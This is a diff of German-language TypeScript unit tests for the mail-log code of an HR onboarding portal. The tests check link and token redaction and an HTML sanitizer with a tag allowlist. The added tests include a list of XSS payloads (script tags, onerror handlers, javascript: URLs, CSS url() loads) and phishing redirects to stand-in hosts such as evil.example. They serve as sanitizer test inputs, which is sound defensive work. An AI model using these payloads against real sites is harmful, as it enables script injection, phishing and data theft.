@@ -38,7 +38,9 @@ import {
   PLATZHALTER_LINK,
   PORTAL_PFADE_ERLAUBT,
   htmlFuerAnsicht,
+  linkWurdeErsetzt,
   linksErsetzen,
+  PLATZHALTER_KENNUNG,
   textAusHtml,
   textFuerProtokoll,
   textHinweis,
@@ -160,7 +162,7 @@ describe("linksErsetzen", () => {
 
 describe("textFuerProtokoll", () => {
   it("kuerzt nach dem Ersetzen und meldet es", () => {
-    const lang = `<p>${"a".repeat(MAX_TEXT_ZEICHEN + 50)}</p> ${APP}/fragebogen/${TOKEN}`;
+    const lang = `<p>${"x".repeat(MAX_TEXT_ZEICHEN + 50)}</p> ${APP}/fragebogen/${TOKEN}`;
     const kopie = textFuerProtokoll(lang, APP);
     expect(kopie.gekuerzt).toBe(true);
     expect(kopie.bodyHtml).toHaveLength(MAX_TEXT_ZEICHEN);
@@ -251,7 +253,7 @@ describe("htmlFuerAnsicht", () => {
 
   it("setzt die CSP auch in ein Fragment ohne head", () => {
     const ansicht = htmlFuerAnsicht("<p>Hallo</p>");
-    expect(ansicht).toMatch(/^<!DOCTYPE html><html><head>.*Content-Security-Policy.*<\/head><body><p>Hallo<\/p><\/body><\/html>$/);
+    expect(ansicht).toMatch(/^<!DOCTYPE html><html><head>.*Content-Security-Policy.*<\/head><body style="margin:0"><p>Hallo<\/p><\/body><\/html>$/);
   });
 });
 
@@ -346,6 +348,20 @@ describe("Durchlauf ueber alle Standardvorlagen", () => {
     },
   );
 
+  it.each(DEFAULT_EMAIL_TEMPLATES.map((t) => [t.event, t] as const))(
+    "%s: das Netz fuer Kennungen greift bei den Beispieldaten nicht ein",
+    (event, template) => {
+      // Eine Standardmail traegt keine UUID im Fliesstext. Greift das Netz hier
+      // ein, steht eine interne Kennung in einer Mail an Menschen — oder das Netz
+      // ist zu grob geworden und frisst Inhalt.
+      const katalog = EVENT_CATALOG.find((d) => d.event === event);
+      const { rendered } = renderEventEmail(alsAufgeloest(template), event, katalog?.samplePayload ?? {}, {
+        overrideTo: "test@beispiel.invalid",
+      });
+      expect(textFuerProtokoll(rendered!.html, APP).bodyHtml).not.toContain(PLATZHALTER_KENNUNG);
+    },
+  );
+
   it.each(PERSOENLICH)("%s: der Zugangslink ist durch den Platzhalter ersetzt", (event) => {
     const template = DEFAULT_EMAIL_TEMPLATES.find((t) => t.event === event)!;
     const echt = `${APP}/fragebogen/${TOKEN}`;
@@ -365,5 +381,296 @@ describe("Durchlauf ueber alle Standardvorlagen", () => {
     // Steht der Link nur im Knopf (href), bleibt dort „#“; steht er als Text
     // da, der Platzhalter. Eines von beiden muss an seiner Stelle sein.
     expect(kopie.includes(PLATZHALTER_LINK) || kopie.includes('href="#"')).toBe(true);
+  });
+});
+
+// =============================================
+// Befunde der Durchsicht vom 15.10.2026
+// =============================================
+
+describe("linksErsetzen: Fehlkonfiguration und Verpackung", () => {
+  it.each([
+    ["hr.fes-credo.de"],
+    ["localhost:3000"],
+    ['"https://hr.fes-credo.de"'],
+    ["'https://hr.fes-credo.de'"],
+    ["  https://hr.fes-credo.de  "],
+    ["https//hr.fes-credo.de"],
+    ["//hr.fes-credo.de"],
+    ["not a url"],
+    [""],
+  ])("kaputte APP_URL %j: der Link bleibt nicht stehen, mit und ohne Schema", (appUrl) => {
+    const html = `<a href="hr.fes-credo.de/fragebogen/${TOKEN}">hr.fes-credo.de/fragebogen/${TOKEN}</a> http://localhost:3000/fragebogen/${TOKEN}`;
+    expect(linksErsetzen(html, appUrl)).not.toContain(TOKEN);
+  });
+
+  it("liest eine APP_URL mit Anfuehrungszeichen und Leerraum wie die saubere", () => {
+    expect(linksErsetzen(`${APP}/vorgaenge/onboarding/${TOKEN}`, ' "https://hr.fes-credo.de" ')).toBe(
+      `${APP}/vorgaenge/onboarding/${TOKEN}`,
+    );
+  });
+
+  it("haelt einen Host ohne Punkt (Tippfehler „https//…“) nicht fuer die Portal-Adresse", () => {
+    // Haette portalHostAus „https“ geliefert, galte hr.fes-credo.de als FREMDER Host und ein
+    // Token ohne UUID-Form bliebe stehen.
+    const kopie = linksErsetzen("https://hr.fes-credo.de/neue-seite/AbCdEfGhIjKlMnOpQr12", "https//hr.fes-credo.de");
+    expect(kopie).toBe(PLATZHALTER_LINK);
+  });
+
+  it.each([
+    ["&quot;http://localhost:3000/unterlagen/UUID&quot;"],
+    ["http://localhost:3000/unterlagen/UUID&nbsp;weiter"],
+    ["&lt;http://localhost:3000/unterlagen/UUID&gt;"],
+    ["http://localhost:3000/unterlagen/UUID&#39;"],
+    ["http://localhost:3000/unterlagen/UUID.pdf"],
+    ["„http://localhost:3000/unterlagen/UUID“"],
+    ["http://localhost:3000/unterlagen/UUID–bitte"],
+    ["https://boese.example/?u=UUID"],
+    ["https://boese.example/f#UUID"],
+    ["https://boese.example/x?a=1&amp;token=SECRET"],
+    ["https://hr.fes-credo.de/vorgaenge/onboarding/abc?tab=dokumente&amp;token=SECRET"],
+    ["https://hr.fes-credo.de/vorgaenge?u=UUID"],
+    ["https://hr.fes-credo.de/login?next=/fragebogen/UUID"],
+    ["https:\\\\hr.fes-credo.de\\fragebogen\\UUID"],
+    ['<a href="https:\\\\hr.fes-credo.de\\fragebogen\\UUID">x</a>'],
+    ["https://hr.fes-credo.de/vorgaenge/onboarding/abc#access_token=UUID"],
+  ])("laesst von %s nichts Lesbares stehen", (vorlage) => {
+    const kopie = linksErsetzen(vorlage.replace(/UUID/g, TOKEN).replace(/SECRET/g, "S3cr3tS3cr3tS3cr3t0000"), APP);
+    expect(kopie).not.toContain(TOKEN);
+    expect(kopie).not.toContain("S3cr3t");
+  });
+
+  it("faltet doppelte Schraegstriche, bevor es den Pfad prueft (APP_URL mit Schlussschraegstrich)", () => {
+    const portal = `https://hr.fes-credo.de//vorgaenge/onboarding/abc?tab=dokumente`;
+    expect(linksErsetzen(portal, "https://hr.fes-credo.de/")).toBe(portal);
+    expect(linksErsetzen(`https://hr.fes-credo.de//fragebogen/${TOKEN}`, "https://hr.fes-credo.de/")).toBe(
+      PLATZHALTER_LINK,
+    );
+  });
+
+  it("ersetzt auch ein relatives href, das nicht zu den erlaubten Seiten gehoert", () => {
+    expect(linksErsetzen(`<a href="/fragebogen/${TOKEN}">x</a>`, APP)).toBe('<a href="#">x</a>');
+    expect(linksErsetzen('<a href="/vorgaenge/onboarding/abc">x</a>', APP)).toBe('<a href="/vorgaenge/onboarding/abc">x</a>');
+  });
+
+  it("entscheidet ueber ein href nach dem Aufloesen der Entitaeten", () => {
+    const kopie = linksErsetzen(`<a href="&#104;ttps://hr.fes-credo.de/fragebogen/${TOKEN}">x</a>`, APP);
+    expect(kopie).not.toContain(TOKEN);
+  });
+
+  describe("Netz fuer Kennungen", () => {
+    it("entfernt eine UUID im Fliesstext und eine lange Hex-Folge", () => {
+      const hex = "0123456789abcdef0123456789abcdef";
+      const kopie = linksErsetzen(`<p>Kennung ${TOKEN} und ${hex} im Text</p>`, APP);
+      expect(kopie).toBe(`<p>Kennung ${PLATZHALTER_KENNUNG} und ${PLATZHALTER_KENNUNG} im Text</p>`);
+    });
+
+    it("laesst die Vorgangs-ID im Pfad einer behaltenen Seite stehen", () => {
+      const html = `<a href="${APP}/vorgaenge/onboarding/${TOKEN}">Vorgang</a> ${APP}/vorgaenge/onboarding/${TOKEN}`;
+      expect(linksErsetzen(html, APP)).toBe(html);
+    });
+
+    it("rettet nichts nach der Entitaet einer behaltenen Adresse hinaus", () => {
+      const kopie = linksErsetzen(`${APP}/vorgaenge/onboarding/abc&quot;${TOKEN}`, APP);
+      expect(kopie).not.toContain(TOKEN);
+      expect(kopie).toContain(`${APP}/vorgaenge/onboarding/abc`);
+    });
+
+    it("beruehrt weder Vorgangsnummern noch kurze Hex-Werte noch Farben", () => {
+      const html = '<p style="color:#575756">ONB-2026-GYM-014, Farbe #FBC900, Kuerzel deadbeef, 28.10.2026</p>';
+      expect(linksErsetzen(html, APP)).toBe(html);
+    });
+  });
+});
+
+describe("linkWurdeErsetzt", () => {
+  it("erkennt Platzhalter, Kennungsplatzhalter und ein entschaerftes href", () => {
+    expect(linkWurdeErsetzt(`<p>${PLATZHALTER_LINK}</p>`)).toBe(true);
+    expect(linkWurdeErsetzt(`<p>${PLATZHALTER_KENNUNG}</p>`)).toBe(true);
+    expect(linkWurdeErsetzt('<a href="#">x</a>')).toBe(true);
+    expect(linkWurdeErsetzt("<a href='#'>x</a>")).toBe(true);
+  });
+
+  it("sagt nein, wenn nichts ersetzt wurde — auch bei einem behaltenen Portal-Link", () => {
+    expect(linkWurdeErsetzt("<p>Hallo</p>")).toBe(false);
+    expect(linkWurdeErsetzt(`<a href="${APP}/vorgaenge/onboarding/abc">x</a>`)).toBe(false);
+  });
+});
+
+describe("htmlFuerAnsicht: Positivliste (Befunde der Durchsicht)", () => {
+  const ERLAUBTE_TAGS = new Set([
+    "a", "abbr", "address", "article", "aside", "b", "blockquote", "br", "caption", "center", "code", "col",
+    "colgroup", "dd", "div", "dl", "dt", "em", "figcaption", "figure", "font", "footer", "h1", "h2", "h3", "h4",
+    "h5", "h6", "header", "hr", "i", "img", "li", "main", "nav", "ol", "p", "pre", "s", "section", "small", "span",
+    "strike", "strong", "sub", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "tr", "u", "ul",
+    "html", "head", "meta", "body",
+  ]);
+  const ERLAUBTE_ATTRIBUTE = new Set([
+    "style", "align", "valign", "width", "height", "bgcolor", "colspan", "rowspan", "cellpadding", "cellspacing",
+    "border", "color", "size", "face", "alt", "title", "lang", "dir", "role", "src", "charset", "http-equiv", "content",
+  ]);
+
+  /** Die Zusagen an die Ausgabe — fuer jede Eingabe, auch fuer die boesen. */
+  function pruefe(ausgabe: string) {
+    expect(ausgabe.startsWith("<!DOCTYPE html><html><head>")).toBe(true);
+    // genau EIN meta-Tag mit http-equiv: unsere CSP (dasselbe als Text im Inhalt waere harmlos)
+    expect((ausgabe.match(/<meta[^>]*http-equiv=/gi) ?? []).length).toBe(1);
+    expect(ausgabe).toContain("Content-Security-Policy");
+    for (const tag of ausgabe.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9:-]*)((?:[^<>"']|"[^"]*"|'[^']*')*)>/g)) {
+      expect({ tag: tag[1].toLowerCase(), erlaubt: ERLAUBTE_TAGS.has(tag[1].toLowerCase()) }).toEqual({
+        tag: tag[1].toLowerCase(),
+        erlaubt: true,
+      });
+      for (const attribut of tag[2].matchAll(/([^\s"'<>/=]+)\s*=/g)) {
+        expect({ attribut: attribut[1].toLowerCase(), erlaubt: ERLAUBTE_ATTRIBUTE.has(attribut[1].toLowerCase()) }).toEqual({
+          attribut: attribut[1].toLowerCase(),
+          erlaubt: true,
+        });
+      }
+    }
+    // ausserhalb der Tags steht kein „<“ mehr
+    expect(ausgabe.replace(/<\/?[a-zA-Z][a-zA-Z0-9:-]*(?:[^<>"']|"[^"]*"|'[^']*')*>/g, "").replace(/<!DOCTYPE html>/, "")).not.toContain("<");
+  }
+
+  const BOESE = [
+    "<scr<script>ipt>alert(1)</scr<script>ipt>",
+    '<me<meta>ta http-equiv="refresh" content="0;url=https://evil.example/phish">',
+    "<fo<form>rm action=https://evil.example><input name=x></fo<form>rm>",
+    "<ifr<iframe>ame src=https://evil.example></ifr<iframe>ame>",
+    "<ob<object>ject data=https://evil.example></ob<object>ject>",
+    "<ba<base>se target=_self href=https://evil.example>",
+    "<img/src=x/onerror=alert(1)>",
+    '<img src="x"onerror=alert(1)>',
+    '<a/href="javascript:alert(1)">x</a>',
+    '<a title="t"href="https://evil.example">x</a>',
+    '<p title="<head>">x</p><img src="https://tracker.example/p.gif">',
+    "<svg onload=alert(1)><circle/></svg>",
+    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
+    "<style>@import url(https://evil.example/x.css);</style>",
+    '<div style="background:url(https://evil.example/t.gif)">x</div>',
+    '<div style="width:expression(alert(1))">x</div>',
+    '<div style="b\\61ckground:u\\72l(https://evil.example/t.gif)">x</div>',
+    '<link rel=stylesheet href="https://evil.example/x.css">',
+    "<!-- <script>alert(1)</script> -->",
+    "<script>alert(1)",
+    '<a href="x>unclosed',
+    "< script>alert(1)</ script>",
+    "<object data=x></object>",
+    "<embed src=x>",
+    "<button formaction=x>x</button>",
+    "<details open ontoggle=alert(1)>x</details>",
+    "<input autofocus onfocus=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    '<a ping="https://evil.example">x</a>',
+    "<img src=x onerror=alert(1)//",
+    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+    "<<script>script>alert(1)<</script>/script>",
+    "<a href=javascript:alert(1)>x</a",
+    '<SCRIPT SRC="https://evil.example/x.js"></SCRIPT>',
+    "<scRipt>alert(1)</scRipt >",
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+  ];
+
+  it.each(BOESE.map((b) => [b]))("haelt die Zusagen bei %s", (eingabe) => {
+    pruefe(htmlFuerAnsicht(eingabe));
+  });
+
+  it("verschachtelte Tags setzen nichts zusammen", () => {
+    const ausgabe = htmlFuerAnsicht("<scr<script>ipt>alert(1)</scr<script>ipt>");
+    expect(ausgabe).not.toMatch(/<script/i);
+    expect(ausgabe).not.toMatch(/<[^>]*alert/i);
+  });
+
+  it("baut den Kopf immer selbst — auch wenn „<head>“ in einem Attribut steht", () => {
+    const ausgabe = htmlFuerAnsicht('<p title="<head>">x</p><img src="https://tracker.example/p.gif">');
+    expect(ausgabe).toMatch(/^<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy"/);
+    expect(ausgabe).not.toContain("tracker.example");
+  });
+
+  it("ein Bild bleibt nur als eingebettetes Bild oder als Logo", () => {
+    expect(htmlFuerAnsicht('<img src="https://tracker.example/p.gif">')).not.toContain("<img");
+    expect(htmlFuerAnsicht('<img src="https://hr.fes-credo.de/credo_logo.png" alt="Logo">')).toContain(
+      '<img src="https://hr.fes-credo.de/credo_logo.png" alt="Logo">',
+    );
+    expect(htmlFuerAnsicht('<img src="data:image/png;base64,iVBORw0KGgo=">')).toContain("<img src=");
+    expect(htmlFuerAnsicht('<img src="data:text/html;base64,PHNjcmlwdD4=">')).not.toContain("<img");
+  });
+
+  it("behaelt Gestaltung und Text einer echten Vorlage", () => {
+    const vorlage = DEFAULT_EMAIL_TEMPLATES.find((t) => t.event === "onboarding-created")!;
+    const { rendered } = renderEventEmail(alsAufgeloest(vorlage), "onboarding-created", {
+      vorname: "Anna",
+      organization: "FES Gymnasium Minden",
+      link: `${APP}/fragebogen/${TOKEN}`,
+    }, { overrideTo: "anna@beispiel.invalid" });
+    const ansicht = htmlFuerAnsicht(textFuerProtokoll(rendered!.html, APP).bodyHtml);
+    pruefe(ansicht);
+    expect(ansicht).toContain("Herzlich willkommen");
+    expect(ansicht).toContain("Personalfragebogen ausfüllen");
+    expect(ansicht).toContain(PLATZHALTER_LINK);
+    expect(ansicht).toContain("background-color:#f4f4f5");
+    expect(ansicht).not.toContain(TOKEN);
+  });
+
+  it("schreibt die Adresse eines behaltenen Links hinter den Linktext", () => {
+    const html = `<a href="${APP}/vorgaenge/onboarding/abc?tab=dokumente" style="color:#000">Vorgang öffnen</a>`;
+    const ansicht = htmlFuerAnsicht(html);
+    expect(ansicht).toContain("Vorgang öffnen</a>");
+    expect(ansicht).toContain(`(${APP}/vorgaenge/onboarding/abc?tab=dokumente)`);
+    expect(ansicht).not.toMatch(/href=/i);
+  });
+
+  it("doppelt die Adresse nicht, wenn sie schon als Linktext dasteht", () => {
+    const adresse = `${APP}/vorgaenge/onboarding/abc`;
+    const ansicht = htmlFuerAnsicht(`<a href="${adresse}">${adresse}</a>`);
+    expect(ansicht.split(adresse).length - 1).toBe(1);
+  });
+
+  it("haelt die Zusagen bei zufaellig zusammengesetzten Eingaben", () => {
+    // Deterministisch (kleiner LCG): dieselben 400 Eingaben bei jedem Lauf.
+    let zustand = 20261015;
+    const zufall = (n: number) => {
+      zustand = (zustand * 1664525 + 1013904223) % 4294967296;
+      return zustand % n;
+    };
+    const SICHER = ["<p>Hallo</p>", "<table><tr><td>x</td></tr></table>", "Text &amp; mehr", "<b>fett</b>", `<a href="${APP}/vorgaenge/x">Link</a>`];
+    const pool = [...BOESE, ...SICHER];
+    for (let lauf = 0; lauf < 400; lauf++) {
+      const teile = Array.from({ length: 2 + zufall(5) }, () => pool[zufall(pool.length)]);
+      const eingabe = teile.join(zufall(3) === 0 ? "" : " ");
+      pruefe(htmlFuerAnsicht(eingabe));
+    }
+  });
+
+  it("braucht fuer lange Eingaben keine unvertretbare Zeit", () => {
+    const eingabe = '<a title="x" '.repeat(20000) + "<p>".repeat(20000);
+    const start = Date.now();
+    htmlFuerAnsicht(eingabe);
+    expect(Date.now() - start).toBeLessThan(3000);
+  });
+});
+
+describe("textAusHtml: Adressen behaltener Links", () => {
+  it("schreibt die Adresse hinter den Linktext", () => {
+    const html = `<p>Bitte pruefen: <a href="${APP}/vorgaenge/onboarding/abc?tab=dokumente">Vorgang öffnen</a></p>`;
+    expect(textAusHtml(html)).toBe(`Bitte pruefen: Vorgang öffnen (${APP}/vorgaenge/onboarding/abc?tab=dokumente)`);
+  });
+
+  it("laesst eine ersetzte Adresse (href=#) und mailto: ohne Klammer", () => {
+    expect(textAusHtml('<a href="#">Fragebogen</a> <a href="mailto:a@b.de">Mail</a>')).toBe("Fragebogen Mail");
+  });
+});
+
+describe("textHinweis: FAILED ohne Betreff", () => {
+  it("nennt als Grund, dass die Mail nie erzeugt wurde", () => {
+    expect(textHinweis({ event: "onboarding-created", status: "FAILED", hatText: false, ohneBetreff: true })).toBe(
+      MAIL_TEXT_MELDUNGEN.nichtErzeugtFehler,
+    );
+  });
+
+  it("mit Betreff bleibt es beim allgemeinen Satz", () => {
+    expect(textHinweis({ event: "onboarding-created", status: "FAILED", hatText: false })).toBe(
+      MAIL_TEXT_MELDUNGEN.nichtGespeichert,
+    );
   });
 });
